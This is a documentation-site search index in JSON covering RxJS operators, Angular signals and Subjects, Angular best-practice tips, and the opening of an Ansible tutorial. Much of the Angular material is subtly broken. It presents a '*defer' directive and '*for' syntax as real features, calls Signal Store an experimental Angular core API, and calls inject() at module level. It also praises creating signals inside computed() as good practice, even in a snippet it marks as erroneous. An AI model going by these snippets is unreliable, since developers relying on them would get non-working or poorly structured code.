}\n}\n</code></pre></li> </ul>"},{"location":"angular/rxjs/#27-interval","title":"27. interval","text":"<ul> <li>Usage: Creates an Observable that emits sequential numbers every specified interval of time.</li> <li>Example:     <pre><code>import { interval } from 'rxjs';\n\ninterval(1000).subscribe(value =&gt; console.log(value)); // Emits a number every second\n</code></pre></li> </ul>"},{"location":"angular/rxjs/#28-startwith","title":"28. startWith","text":"<ul> <li>Usage: Emits the specified initial values before any values emitted by the source Observable.</li> <li>Example:     <pre><code>import { of } from 'rxjs';\nimport { startWith } from 'rxjs/operators';\n\nof(2, 3).pipe(\n  startWith(1)\n).subscribe(value =&gt; console.log(value)); // Output: 1, 2, 3\n</code></pre></li> </ul>"},{"location":"angular/rxjs/#29-take","title":"29. take","text":"<ul> <li>Usage: Takes only the first N values from an Observable and then completes.</li> <li>Example:     <pre><code>import { of } from 'rxjs';\nimport { take } from 'rxjs/operators';\n\nof(1, 2, 3, 4, 5).pipe(\n  take(3)\n).subscribe(value =&gt; console.log(value)); // Output: 1, 2, 3\n</code></pre></li> </ul>"},{"location":"angular/rxjs/#additional-angular-features-beyond-rxjs-operators","title":"Additional Angular Features Beyond RxJS Operators","text":"<p>Angular has introduced several innovative features recently to improve reactivity, component lifecycle management, and lazy loading. Here\u2019s a closer look at more of these features:</p>"},{"location":"angular/rxjs/#1-signals-angular-16","title":"1. Signals (Angular 16+)","text":"<ul> <li>What it is: Signals are a reactivity model for managing component state, inspired by reactive programming concepts.</li> <li>Use case: Provides a simpler way to manage local state in components, ideal for controlling reactivity without manual change detection.</li> </ul> <pre><code>import { signal, computed, effect } from '@angular/core';\n\n// Define a signal\nconst counter = signal(0);\n\n// Computed signal\nconst doubleCounter = computed(() =&gt; counter() * 2);\n\n// Effect on signal\neffect(() =&gt; {\n  console.log(`Counter value: ${counter()}`);\n});\n\n// Update the signal\ncounter.set(counter() + 1); // increments counter by 1\n</code></pre>"},{"location":"angular/rxjs/#2-tosignal","title":"2. toSignal","text":"<ul> <li>What it is: Converts an observable to a signal for seamless integration with Angular\u2019s signal-based reactivity model.</li> <li>Use case: Ideal for integrating RxJS streams or service observables with components using signals.</li> </ul> <pre><code>import { interval } from 'rxjs';\nimport { toSignal } from '@angular/core/rxjs-interop';\n\nconst interval$ = interval(1000); // emits every second\nconst intervalSignal = toSignal(interval$);\n\neffect(() =&gt; {\n  console.log(`Interval signal value: ${intervalSignal()}`);\n});\n</code></pre>"},{"location":"angular/rxjs/#3-defer-directive","title":"3. defer Directive","text":"<ul> <li>What it is: A structural directive that defers rendering of components until specific conditions are met, like visibility or data readiness.</li> <li>Use case: Ideal for improving performance by lazy-loading content.</li> </ul> <pre><code>&lt;ng-container *defer=\"isVisible\"&gt;\n  &lt;app-heavy-component&gt;&lt;/app-heavy-component&gt;\n&lt;/ng-container&gt;\n</code></pre>"},{"location":"angular/rxjs/#4-destroyref-componentdirective-destruction-event","title":"4. destroyRef (Component/Directive Destruction Event)","text":"<ul> <li>What it is: <code>DestroyRef</code> is a new injectable that allows for executing cleanup code when a component or directive is destroyed.</li> <li>Use case: Useful for managing resources like WebSockets, non-Angular observables, or event listeners.</li> </ul> <pre><code>import { DestroyRef } from '@angular/core';\n\nconstructor(private destroyRef: DestroyRef) {\n  const myResource = openResource();\n\n  this.destroyRef.onDestroy(() =&gt; {\n    myResource.close(); // Clean up when destroyed\n  });\n}\n</code></pre>"},{"location":"angular/rxjs/#5-signal-store-experimental","title":"5. Signal Store (Experimental)","text":"<ul> <li>What it is: Angular\u2019s experimental state management solution with signals.</li> <li>Use case: Provides a simple API for state management without needing traditional stores or observables.</li> </ul> <pre><code>import { signal } from '@angular/core';\n\nclass CounterStore {\n  count = signal(0);\n\n  increment() {\n    this.count.set(this.count() + 1);\n  }\n}\n\nconst store = new CounterStore();\neffect(() =&gt; {\n  console.log(`Count: ${store.count()}`);\n});\n\nstore.increment(); // Count updates to 1\n</code></pre>"},{"location":"angular/rxjs/#6-inject-function","title":"6. inject Function","text":"<ul> <li>What it is: A utility function for injecting dependencies outside of Angular components.</li> <li>Use case: Ideal for dependency injection in utility functions or standalone components.</li> </ul> <pre><code>import { inject } from '@angular/core';\nimport { MyService } from './my-service';\n\nconst myService = inject(MyService);\nmyService.doSomething();\n</code></pre>"},{"location":"angular/rxjs/#7-host-directives","title":"7. Host Directives","text":"<ul> <li>What it is: Host Directives allow you to add multiple directive functionalities directly to a component.</li> <li>Use case: Useful for applying shared behaviors or styling directly to components without cluttering templates.</li> </ul> <pre><code>import { Directive, HostBinding } from '@angular/core';\n\n@Directive({\n  selector: '[highlight]'\n})\nexport class HighlightDirective {\n  @HostBinding('style.backgroundColor') bgColor = 'yellow';\n}\n\n@Component({\n  selector: 'app-example',\n  hostDirectives: [HighlightDirective]\n})\nexport class ExampleComponent {}\n</code></pre>"},{"location":"angular/rxjs/#8-standalone-components-with-providers","title":"8. Standalone Components with Providers","text":"<ul> <li>What it is: Allows defining providers directly within standalone components.</li> <li>Use case: Simplifies dependency injection for components without NgModules.</li> </ul> <pre><code>import { Component } from '@angular/core';\nimport { MyService } from './my-service';\n\n@Component({\n  selector: 'app-standalone',\n  standalone: true,\n  providers: [MyService]\n})\nexport class StandaloneComponent {\n  constructor(private myService: MyService) {\n    this.myService.doSomething();\n  }\n}\n</code></pre> <p>Each of these operators and Angular features gives you powerful tools for managing state, reactivity, and performance. Replace any <code>...</code> with additional details as needed.</p>"},{"location":"angular/subjects/","title":"RxJS Subjects: Understanding <code>Subject</code>, <code>BehaviorSubject</code>, <code>ReplaySubject</code>, and <code>AsyncSubject</code>","text":"<p>In RxJS, <code>Subjects</code> are a special type of <code>Observable</code> that allow values to be multicasted to multiple subscribers. Unlike regular observables, subjects act as both an observer (you can <code>next</code>, <code>error</code>, or <code>complete</code> them) and an observable (you can subscribe to them). This makes them useful for scenarios where you need to share data or events across multiple components or services in Angular.</p>"},{"location":"angular/subjects/#1-subject","title":"1. <code>Subject</code>","text":"<p>A <code>Subject</code> is the simplest form of an RxJS subject. It doesn't hold any initial value and only emits values to subscribers that are subscribed at the time of emission.</p>"},{"location":"angular/subjects/#example-of-subject","title":"Example of <code>Subject</code>","text":"<pre><code>import { Subject } from 'rxjs';\n\nconst subject = new Subject&lt;number&gt;();\n\n// Subscriber 1\nsubject.subscribe(value =&gt; {\n  console.log(`Subscriber 1: ${value}`);\n});\n\nsubject.next(1); // Subscriber 1 receives 1\nsubject.next(2); // Subscriber 1 receives 2\n\n// Subscriber 2 subscribes after some values have been emitted\nsubject.subscribe(value =&gt; {\n  console.log(`Subscriber 2: ${value}`);\n});\n\n// Only receives future values\nsubject.next(3); // Both Subscriber 1 and Subscriber 2 receive 3\n</code></pre>"},{"location":"angular/subjects/#key-characteristics-of-subject","title":"Key Characteristics of <code>Subject</code>","text":"<ul> <li>No Initial Value: <code>Subject</code> does not hold an initial value, so new subscribers do not receive any previously emitted values.</li> <li>Multicasting: All subscribers receive the same values in real-time, which makes <code>Subject</code> suitable for event emitters or data streams.</li> <li>For Real-Time Only: Only useful for situations where subscribers only care about future values after they subscribe.</li> </ul>"},{"location":"angular/subjects/#use-cases-for-subject","title":"Use Cases for <code>Subject</code>","text":"<ul> <li>Event Emitters: Use for broadcasting events like button clicks.</li> <li>Manual Data Emission: When you need to manually control when values are emitted.</li> <li>Multicasting Events: For multicasting data/events to multiple observers in real-time.</li> </ul>"},{"location":"angular/subjects/#2-behaviorsubject","title":"2. <code>BehaviorSubject</code>","text":"<p>A <code>BehaviorSubject</code> holds a default (initial) value and emits the most recent value to new subscribers upon subscription, making it suitable for state management.</p>"},{"location":"angular/subjects/#example-of-behaviorsubject","title":"Example of <code>BehaviorSubject</code>","text":"<pre><code>import { BehaviorSubject } from 'rxjs';\n\nconst behaviorSubject = new BehaviorSubject&lt;number&gt;(0); // Initial value is set to 0\n\nbehaviorSubject.subscribe(value =&gt; {\n  console.log(`Subscriber 1: ${value}`);\n});\n\nbehaviorSubject.next(1); // Subscriber 1 receives 1\nbehaviorSubject.next(2); // Subscriber 1 receives 2\n\nbehaviorSubject.subscribe(value =&gt; {\n  console.log(`Subscriber 2: ${value}`); // Immediately receives the last emitted value (2)\n});\n\nbehaviorSubject.next(3); // Both subscribers receive 3\n</code></pre>"},{"location":"angular/subjects/#key-characteristics-of-behaviorsubject","title":"Key Characteristics of <code>BehaviorSubject</code>","text":"<ul> <li>Initial Value: Requires an initial value, which new subscribers receive immediately.</li> <li>Latest Value Replay: New subscribers always receive the latest value, even if they subscribe after emissions have started.</li> <li>State Management: Ideal for storing and sharing the current state across components.</li> </ul>"},{"location":"angular/subjects/#use-cases-for-behaviorsubject","title":"Use Cases for <code>BehaviorSubject</code>","text":"<ul> <li>Shared State: Manage shared state across components (e.g., user session, selected item).</li> <li>Reactive Forms: Use to manage form values and share them reactively.</li> <li>Default Values: When you need to provide a default value to new subscribers.</li> </ul>"},{"location":"angular/subjects/#3-replaysubject","title":"3. <code>ReplaySubject</code>","text":"<p>A <code>ReplaySubject</code> replays a specified number of the most recent values to new subscribers. You can configure it to replay a specific number of emissions or set a time window for how long to retain values.</p>"},{"location":"angular/subjects/#example-of-replaysubject","title":"Example of <code>ReplaySubject</code>","text":"<pre><code>import { ReplaySubject } from 'rxjs';\n\nconst replaySubject = new ReplaySubject&lt;number&gt;(2); // Replay the last 2 values\n\nreplaySubject.next(1);\nreplaySubject.next(2);\nreplaySubject.next(3);\n\nreplaySubject.subscribe(value =&gt; {\n  console.log(`Subscriber: ${value}`);\n}); // Receives 2, 3 (last 2 values emitted before subscription)\n\nreplaySubject.next(4); // Subscriber receives 4\n</code></pre>"},{"location":"angular/subjects/#key-characteristics-of-replaysubject","title":"Key Characteristics of <code>ReplaySubject</code>","text":"<ul> <li>Replay Control: Can configure how many past values to retain (by count or time).</li> <li>Replays Values to New Subscribers: New subscribers receive the last emitted values based on the replay configuration.</li> <li>Memory-Intensive: Retains a specified number of values, which can lead to high memory usage if not carefully managed.</li> </ul>"},{"location":"angular/subjects/#use-cases-for-replaysubject","title":"Use Cases for <code>ReplaySubject</code>","text":"<ul> <li>Caching Data: Useful for caching data and replaying it to new subscribers (e.g., data loading).</li> <li>Multi-Step Forms: Retain form step data so new components in a wizard can access previous steps.</li> <li>Sharing Latest Updates: When new subscribers need a recent history of values upon subscription.</li> </ul>"},{"location":"angular/subjects/#4-asyncsubject","title":"4. <code>AsyncSubject</code>","text":"<p>An <code>AsyncSubject</code> only emits the last value upon completion. Subscribers do not receive any values until the subject completes.</p>"},{"location":"angular/subjects/#example-of-asyncsubject","title":"Example of <code>AsyncSubject</code>","text":"<pre><code>import { AsyncSubject } from 'rxjs';\n\nconst asyncSubject = new AsyncSubject&lt;number&gt;();\n\nasyncSubject.subscribe(value =&gt; {\n  console.log(`Subscriber: ${value}`);\n});\n\nasyncSubject.next(1);\nasyncSubject.next(2);\nasyncSubject.complete(); // Subscriber receives only the last value (2)\n</code></pre>"},{"location":"angular/subjects/#key-characteristics-of-asyncsubject","title":"Key Characteristics of <code>AsyncSubject</code>","text":"<ul> <li>Last Value on Completion: Only emits the last value and only when the subject completes.</li> <li>Useful for Single-Emission: Typically used when you want to emit a final result after a series of events or operations.</li> </ul>"},{"location":"angular/subjects/#use-cases-for-asyncsubject","title":"Use Cases for <code>AsyncSubject</code>","text":"<ul> <li>Final Result Emission: For scenarios where you only care about the final value (e.g., an HTTP request or a calculation).</li> <li>Data Caching on Completion: Emit data only after a process is fully complete.</li> </ul>"},{"location":"angular/subjects/#key-differences-between-subjects","title":"Key Differences Between Subjects","text":"Feature <code>Subject</code> <code>BehaviorSubject</code> <code>ReplaySubject</code> <code>AsyncSubject</code> Initial Value No Yes No No Last Value on Subscribe No Yes Yes (based on replay config) Yes, but only on complete Replay Values No Latest only Configurable (by count or time) Last value only on complete Use Case Event streams State management Caching or multi-step processes Final result after completion"},{"location":"angular/subjects/#best-practices-with-rxjs-subjects","title":"Best Practices with RxJS Subjects","text":"<ol> <li>Use the Right Subject Type: Choose the type of subject based on your use case:</li> <li><code>Subject</code> for real-time event streaming.</li> <li><code>BehaviorSubject</code> for state management with an initial value.</li> <li><code>ReplaySubject</code> for sharing past values or caching.</li> <li> <p><code>AsyncSubject</code> for cases where you only care about the final result.</p> </li> <li> <p>Avoid Overusing Subjects: Subjects are powerful, but they can introduce complexities and make code harder to follow if overused. Use other reactive patterns (like observables or signals in Angular) when subjects are unnecessary.</p> </li> <li> <p>Encapsulate Subjects in Services: In Angular, encapsulate subjects in services and expose them as <code>Observables</code> to avoid direct modification from external components. This provides better encapsulation and makes your services easier to test and maintain.</p> </li> </ol> <pre><code>import { Injectable } from '@angular/core';\nimport { BehaviorSubject, Observable } from 'rxjs';\n\n@Injectable({\n  providedIn: 'root',\n})\nexport class StateService {\n  private stateSubject = new BehaviorSubject&lt;number&gt;(0);\n  public state$: Observable&lt;number&gt; = this.stateSubject.asObservable();\n\n  setState(value: number) {\n    this.stateSubject.next(value);\n  }\n}\n</code></pre> <ol> <li>Use <code>AsyncPipe</code> for Subscription Management: When using subjects in Angular templates, use the <code>AsyncPipe</code> to manage subscriptions automatically and avoid memory leaks.</li> </ol> <pre><code>&lt;div *ngIf=\"stateService.state$ | async as state\"&gt;\n  Current State: {{ state }}\n&lt;/div&gt;\n</code></pre> <ol> <li>Avoid Exposing Subjects Directly: Always expose an <code>Observable</code> instead of the <code>Subject</code> itself to components. This prevents direct mutation from outside and keeps the data flow predictable.</li> </ol>"},{"location":"angular/subjects/#summary","title":"Summary","text":"<p>Subjects in RxJS (<code>Subject</code>, <code>BehaviorSubject</code>, <code>ReplaySubject</code>, <code>AsyncSubject</code>) offer various ways to handle and share data streams: - Use <code>Subject</code> for simple, real-time events. - Use <code>BehaviorSubject</code> when you need an initial value and want new subscribers to receive the latest value. - Use <code>ReplaySubject</code> when you want to cache or replay a specified number of recent values. - Use <code>AsyncSubject</code> for cases where only the final value after completion is needed.</p> <p>By understanding the differences and choosing the right type for each use case, you can effectively manage state and events in your Angular and RxJS applications.</p>"},{"location":"angular/tips/","title":"Tips","text":""},{"location":"angular/tips/#rxjs-best-practices-and-expert-level-tips","title":"RxJS Best Practices and Expert-Level Tips","text":"<ol> <li>Understand and Control Memory Leaks</li> <li>Why: Memory leaks in RxJS are common due to improper subscriptions and missed unsubscriptions.</li> <li>How: Use <code>takeUntil</code>, <code>takeWhile</code>, <code>first</code>, or <code>complete</code> to handle unsubscriptions, particularly in Angular components with lifecycles.</li> <li>Tip: Use <code>AsyncPipe</code> in templates to handle subscription and unsubscription automatically. For manual subscription, always pair with <code>takeUntil</code> and a <code>Subject</code> to ensure unsubscription in <code>ngOnDestroy</code>.</li> </ol> <pre><code>private destroy$ = new Subject&lt;void&gt;();\nobservable$.pipe(takeUntil(this.destroy$)).subscribe();\n\nngOnDestroy() {\n  this.destroy$.next();\n  this.destroy$.complete();\n}\n</code></pre> <ol> <li>Understand Hot vs. Cold Observables</li> <li>Why: Hot observables share values across multiple subscribers, while cold observables create a new subscription and emit values per subscriber.</li> <li>How: Use <code>shareReplay</code>, <code>publishReplay</code>, or <code>multicast</code> to convert a cold observable into a hot one when you want to share the source among subscribers without resubscribing.</li> <li> <p>Tip: Convert HTTP requests (cold by default) to hot observables when multiple components depend on the same data source.</p> </li> <li> <p>Avoid Nested Subscriptions</p> </li> <li>Why: Nesting subscriptions can lead to hard-to-debug code and potential memory issues.</li> <li>How: Use <code>mergeMap</code>, <code>concatMap</code>, or <code>switchMap</code> to flatten observables instead of nesting them.</li> <li>Example:</li> </ol> <pre><code>// Instead of nesting:\nobservable1.subscribe(value1 =&gt; {\n  observable2.subscribe(value2 =&gt; {\n    console.log(value1, value2);\n  });\n});\n\n// Use flattening operators:\nobservable1.pipe(\n  switchMap(value1 =&gt; observable2.pipe(map(value2 =&gt; ({ value1, value2 }))))\n).subscribe(({ value1, value2 }) =&gt; {\n  console.log(value1, value2);\n});\n</code></pre> <ol> <li>Use Operators to Manage Complex Streams</li> <li>Why: Complex data flows benefit from structured operators for performance and readability.</li> <li>Operators:<ul> <li><code>combineLatest</code> and <code>forkJoin</code> for coordinating streams.</li> <li><code>catchError</code> and <code>retryWhen</code> for error handling and retry logic.</li> <li><code>debounceTime</code>, <code>throttleTime</code>, and <code>auditTime</code> for handling rapid emissions (e.g., user inputs).</li> </ul> </li> <li> <p>Tip: Use <code>catchError</code> at the point where errors occur, and <code>retryWhen</code> with backoff strategies to prevent infinite retries.</p> </li> <li> <p>Use Higher-Order Mapping Operators Wisely</p> </li> <li>Choosing the Right Operator:<ul> <li><code>mergeMap</code>: Use for concurrent processing (e.g., loading related data without waiting).</li> <li><code>concatMap</code>: Use when order is important, and each observable should complete before the next.</li> <li><code>switchMap</code>: Use when only the latest observable\u2019s results matter, discarding previous values.</li> <li><code>exhaustMap</code>: Use to ignore new emissions while a previous one is still active (e.g., ignoring extra button clicks).</li> </ul> </li> </ol>"},{"location":"angular/tips/#angular-best-practices-and-advanced-concepts","title":"Angular Best Practices and Advanced Concepts","text":"<ol> <li>Optimize Change Detection</li> <li>Why: Change detection cycles are a performance bottleneck.</li> <li>How: Use <code>OnPush</code> change detection strategy for components with mostly immutable data or inputs that change infrequently.</li> <li>Tip: Use <code>markForCheck()</code> in OnPush components when an external event needs to trigger an update.</li> </ol> <pre><code>@Component({\n  selector: 'app-my-component',\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class MyComponent {\n  @Input() data: any;\n\n  constructor(private cdr: ChangeDetectorRef) {}\n\n  updateData(newData) {\n    this.data = newData;\n    this.cdr.markForCheck();\n  }\n}\n</code></pre> <ol> <li>Use Lazy Loading and Preloading for Routes</li> <li>Why: Lazy loading improves initial load times by loading modules only when needed.</li> <li>How: Define routes with <code>loadChildren</code> and configure preloading strategies for optimizing load times.</li> <li>Tip: Use <code>PreloadAllModules</code> strategy in route configuration to load non-critical routes in the background after the main app is loaded.</li> </ol> <pre><code>const routes: Routes = [\n  { path: 'feature', loadChildren: () =&gt; import('./feature/feature.module').then(m =&gt; m.FeatureModule) }\n];\n\n@NgModule({\n  imports: [RouterModule.forRoot(routes, { preloadingStrategy: PreloadAllModules })],\n  exports: [RouterModule]\n})\nexport class AppRoutingModule {}\n</code></pre> <ol> <li>Manage State with Reactive Patterns (NgRx, Signals)</li> <li>Why: Complex applications benefit from centralized, predictable state management.</li> <li>How: Use NgRx for managing large, complex states with actions and reducers, or Angular Signals for simpler state management with reactive data streams.</li> <li> <p>Tip: Use NgRx effects for handling asynchronous side effects like HTTP requests.</p> </li> <li> <p>Use Dependency Injection with <code>inject()</code> in Standalone Components and Services</p> </li> <li>Why: Angular\u2019s <code>inject()</code> function allows dependencies to be injected outside of constructors, useful in factory functions or standalone components.</li> <li>How: Use <code>inject</code> in providers or helper functions where the constructor is not accessible.</li> <li>Example:</li> </ol> <pre><code>import { inject } from '@angular/core';\nimport { HttpClient } from '@angular/common/http';\n\nconst http = inject(HttpClient);\n\nexport function fetchData() {\n  return http.get('/api/data');\n}\n</code></pre> <ol> <li>Utilize <code>AsyncPipe</code> to Auto-Manage Observables in Templates</li> <li>Why: Using <code>AsyncPipe</code> removes the need for manual subscription management in components.</li> <li>How: Use <code>| async</code> in templates to automatically subscribe and unsubscribe to observables.</li> <li>Example:</li> </ol> <pre><code>&lt;div *ngIf=\"data$ | async as data\"&gt;\n  {{ data }}\n&lt;/div&gt;\n</code></pre> <ol> <li>Optimize Forms with Reactive Forms and FormBuilder</li> <li>Why: Reactive Forms provide better control over form state, validation, and dynamic fields.</li> <li>How: Use <code>FormBuilder</code> to create complex form controls and validations, and <code>AbstractControl</code> for validation logic.</li> <li>Tip: Avoid using <code>NgModel</code> with Reactive Forms for consistency.</li> </ol> <pre><code>import { FormBuilder, FormGroup, Validators } from '@angular/forms';\n\nexport class MyComponent {\n  form: FormGroup;\n\n  constructor(private fb: FormBuilder) {\n    this.form = this.fb.group({\n      name: ['', Validators.required],\n      email: ['', [Validators.required, Validators.email]]\n    });\n  }\n}\n</code></pre> <ol> <li>Leverage Angular\u2019s Intersection Observer for Lazy Loading</li> <li>Why: Intersection Observer is efficient for loading components or images only when they\u2019re visible.</li> <li>How: Use <code>IntersectionObserver</code> in directives or components to detect when elements enter the viewport.</li> <li>Tip: Ideal for lazy-loading images, animations, or heavy components.</li> </ol> <pre><code>import { Directive, ElementRef } from '@angular/core';\n\n@Directive({ selector: '[lazyLoad]' })\nexport class LazyLoadDirective {\n  constructor(private el: ElementRef) {\n    const observer = new IntersectionObserver(entries =&gt; {\n      entries.forEach(entry =&gt; {\n        if (entry.isIntersecting) {\n          this.loadImage();\n          observer.disconnect();\n        }\n      });\n    });\n    observer.observe(this.el.nativeElement);\n  }\n\n  private loadImage() {\n    this.el.nativeElement.src = this.el.nativeElement.dataset.src;\n  }\n}\n</code></pre> <ol> <li>Prefer Standalone Components and Directives</li> <li>Why: Standalone components reduce module dependencies and simplify Angular\u2019s module architecture.</li> <li>How: Use <code>standalone: true</code> in component metadata to make it a standalone component, importing only necessary modules directly.</li> <li>Example:</li> </ol> <pre><code>import { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-standalone',\n  standalone: true,\n  template: '&lt;p&gt;Standalone Component&lt;/p&gt;',\n  imports: [CommonModule]\n})\nexport class StandaloneComponent {}\n</code></pre>"},{"location":"angular/tips/#performance-optimization-tips","title":"Performance Optimization Tips","text":"<ol> <li>Reduce <code>ChangeDetection</code> cycles using <code>OnPush</code> where possible.</li> <li>Memoize computed values in Angular signals or services to avoid recalculating unchanged data.</li> <li>Use <code>trackBy</code> with <code>*ngFor</code> to avoid unnecessary re-rendering of lists.</li> <li>Cache HTTP Requests: Use <code>shareReplay</code> with HTTP observables to cache data locally if multiple parts of your app rely on the same data.</li> </ol> <pre><code>export class SelectCmp {\n  options = input&lt;string[]&gt;();\n\n  state = computed(() =&gt; {\n    return {\n      options: this.options(),\n      index: signal(-1),\n    };\n  });\n\n  select(idx: number) {\n    this.state().index.set(idx);\n  }\n}\n</code></pre>"},{"location":"angular/tips/#why-this-is-good-practice","title":"Why This Is Good Practice","text":"<ol> <li>Reactive State Management with Signals:</li> <li>The use of <code>signal(-1)</code> for <code>index</code> enables reactive state management in Angular. Signals allow the component to reactively track and update the <code>index</code> value without triggering unnecessary re-renders or managing complex observable chains.</li> <li> <p>Signals are lightweight and automatically update only the components or DOM elements that depend on them, making the app more performant and easier to reason about.</p> </li> <li> <p>Computed State:</p> </li> <li>Using <code>computed</code> for <code>state</code> encapsulates multiple reactive properties (<code>options</code> and <code>index</code>) in a single state object. Computed properties in Angular re-evaluate only when their dependencies change, which reduces computation and improves performance.</li> <li> <p>This approach also enhances readability and encapsulation, as <code>state</code> combines both <code>options</code> and <code>index</code> in one reactive structure.</p> </li> <li> <p>Functional Reactive Approach:</p> </li> <li> <p>The <code>select</code> method directly modifies <code>index</code> within <code>state</code>, maintaining a functional reactive approach. This method simply sets the new index without introducing additional logic, which keeps the codebase clean and focused on managing state transitions.</p> </li> <li> <p>Use of <code>input</code> and Dependency Injection:</p> </li> <li> <p>The <code>input&lt;string[]&gt;()</code> function suggests dependency injection or a decorator pattern for injecting or passing data into the component, following Angular's dependency injection principles. This keeps the component decoupled from specific data sources, making it more reusable and testable.</p> </li> <li> <p>Separation of Concerns:</p> </li> <li> <p>This structure separates the component's data (<code>options</code> and <code>index</code>) from the logic (<code>select</code> method), which improves code maintainability. Each part of the component is responsible for a single concern (e.g., <code>options</code> manages available options, <code>index</code> manages the selected option).</p> </li> <li> <p>Avoiding Direct DOM Manipulation:</p> </li> <li> <p>Instead of directly manipulating the DOM to manage the selected state, this example uses reactive state management. Angular\u2019s change detection handles the UI updates based on reactive data changes, resulting in more maintainable and declarative code.</p> </li> <li> <p>Readability and Future Compatibility:</p> </li> <li>This setup aligns with Angular's push towards signals and reactive programming patterns, making the code future-proof as Angular continues to evolve towards more reactive paradigms.</li> <li>By using signals and computed properties, this code is ready to take advantage of future Angular optimizations and provides better readability for developers familiar with reactive programming.</li> </ol>"},{"location":"angular/tips/#summary","title":"Summary","text":"<p>This example illustrates best practices in Angular's modern reactive programming model: - Efficiently managing state with signals and computed properties. - Reducing re-renders and manual subscriptions. - Enhancing readability, encapsulation, and performance.</p> <pre><code>@Component({\n  template: `\n    &lt;ul&gt;\n      &lt;li *for=\"option of options; track option\" (click)=\"select($index)\"&gt;\n        {{ option }}\n      &lt;/li&gt;\n    &lt;/ul&gt;\n  `\n})\nexport class SelectCmp {\n  name = input('');\n\n  myName = computed(() =&gt; signal(this.name()));\n\n  setName(name: string) {\n    this.myName().set(name); // ERROR: no set method\n  }\n\n  options = input&lt;string[]&gt;();\n\n  state = computed(() =&gt; {\n    return {\n      options: this.options(),\n      index: signal(-1),\n    };\n  });\n}\n</code></pre>"},{"location":"angular/tips/#explanation-and-best-practices","title":"Explanation and Best Practices","text":"<ol> <li>Use of <code>input()</code> for Reactive Inputs:</li> <li><code>input('')</code> is used to declare <code>name</code> and <code>options</code> as reactive inputs.</li> <li> <p>These inputs provide reactive values from a parent component, allowing the child component to respond to changes automatically.</p> </li> <li> <p>Computed Property <code>myName</code>:</p> </li> <li><code>myName</code> is declared as a <code>computed</code> property that wraps the <code>name</code> input in a signal.</li> <li>The computed function returns a new signal based on the value of <code>this.name()</code>.</li> <li> <p>This setup allows <code>myName</code> to reactively depend on <code>name</code>, recalculating whenever <code>name</code> changes.</p> </li> <li> <p>Error with <code>setName</code> Method:</p> </li> <li>The <code>setName</code> method attempts to call <code>this.myName().set(name)</code>, but this results in an error because computed properties in Angular do not have a <code>set</code> method.</li> <li> <p>This highlights an important concept: computed properties are read-only and cannot be directly modified. They are meant to derive values based on other signals and inputs.</p> </li> <li> <p>State Management with <code>computed</code>:</p> </li> <li>The <code>state</code> computed property encapsulates multiple reactive properties (<code>options</code> and <code>index</code>) in a single object.</li> <li><code>state</code> provides a single source of truth for the component\u2019s reactive data, making the data flow more manageable and reducing the need for separate state management logic.</li> <li> <p>The <code>index</code> property within <code>state</code> is a signal with an initial value of <code>-1</code>, representing the selected index.</p> </li> <li> <p>Template Usage:</p> </li> <li>In the template, <code>*for=\"option of options; track option\"</code> iterates over the <code>options</code> array.</li> <li>The <code>(click)=\"select($index)\"</code> event listener allows users to select an option, potentially modifying the <code>index</code> signal in the component's state (although the <code>select</code> method is not defined here).</li> </ol>"},{"location":"angular/tips/#why-this-is-good-practice_1","title":"Why This is Good Practice","text":"<ul> <li>Reactive and Declarative: By using <code>input()</code>, <code>signal()</code>, and <code>computed()</code>, the component\u2019s state is reactive and declarative. This approach aligns with Angular's move towards a more reactive programming model.</li> <li>Encapsulation of State: The <code>state</code> computed property encapsulates all relevant data in a single object, making it easier to manage and understand.</li> <li>Read-Only Computed Values: Using computed values as read-only derived data (e.g., <code>myName</code>) helps avoid unintended side effects and ensures that each piece of data has a clear, single responsibility.</li> <li>Fine-Grained Reactivity: Signals and computed properties allow for fine-grained reactivity, updating only the parts of the component that depend on specific data, resulting in better performance.</li> </ul>"},{"location":"angular/tips/#summary_1","title":"Summary","text":"<p>This example demonstrates Angular\u2019s new reactive programming features, including: - <code>input()</code> for receiving reactive inputs, - <code>signal</code> and <code>computed</code> for managing and deriving reactive state, - and declarative state management that aligns with Angular's evolving approach to reactivity.</p> <p>While this code snippet has an error (<code>myName</code> is read-only), it serves as a learning point about computed properties' immutability and Angular's reactive design principles.</p>"},{"location":"ansible/ansible/","title":"Ansible Tutorial: Real-Life Examples and Features","text":""},{"location":"ansible/ansible/#advanced-features","title":"Advanced Features","text":""},{"location":"ansible/ansible/#dynamic-inventories","title":"Dynamic Inventories","text":"<p>Instead of static hosts lists, Ansible can use dynamic inventories that pull host information from external sources, like cloud providers.</p> <pre><code>ansible-inventory -i inventory_aws_ec2.yml --graph\n</code></pre>"},{"location":"ansible/ansible/#templating-with-jinja2","title":"Templating with Jinja2","text":"<p>Ansible utilizes Jinja2 templating to dynamically generate files or variables based on the inventory data.</p> <pre><code># template.j2\nHello, {{ user_name }}! Welcome to {{ service_name }}.\n</code></pre>"},{"location":"ansible/ansible/#conditional-execution","title":"Conditional Execution","text":"<p>Execute tasks based on conditions.</p> <pre><code>- name: Restart nginx only on Debian systems\n  ansible.builtin.service:\n    name: nginx\n    state: restarted\n  when: ansible_facts['os_family'] == \"Debian\"\n</code></pre>"},{"location":"ansible/ansible/#loops","title":"Loops","text":"<p>Perform tasks on a list of items.</p> <pre><code>- name: Install multiple packages\n  ansible.builtin.yum:\n    name: \"{{ item }}\"\n    state: present\n  loop:\n    - nginx\n    - nodejs\n</code></pre>"},{"location":"ansible/ansible/#error-handling","title":"Error Handling","text":"<p>Use blocks to handle errors and perform cleanup.</p> <pre><code>- name: Attempt and clean up task\n  block:\n    - name: Attempt to do something\n      ansible.builtin.command: /bin/false\n  rescue:\n    - name: Clean up after failure\n      ansible.builtin.file:\n        path: /some/path\n        state: absent\n</code></pre>"},{"location":"ansible/ansible/#real-life-example-scenarios","title":"Real-Life Example Scenarios","text":""},{"location":"ansible/ansible/#configuration-management","title":"Configuration Management","text":"<p>Automatically configure and maintain consistency of settings and software on servers.</p> <pre><code>- hosts: webservers\n  roles:\n    - role: nginx\n    - role: php-fpm\n    - role: letsencrypt\n</code></pre>"},{"location":"ansible/ansible/#continuous-deployment","title":"Continuous Deployment","text":"<p>Deploy applications automatically to different environments after passing CI/CD pipelines.</p> <pre><code>- hosts: production_servers\n  tasks:\n    - name: Pull latest code from Git\n      ansible.builtin.git:\n        repo: 'https://example.com/repo.git'\n        dest: /var/www/html/app\n        version: master\n    - name: Restart application service\n      ansible.builtin.service:\n        name: my_app\n        state: 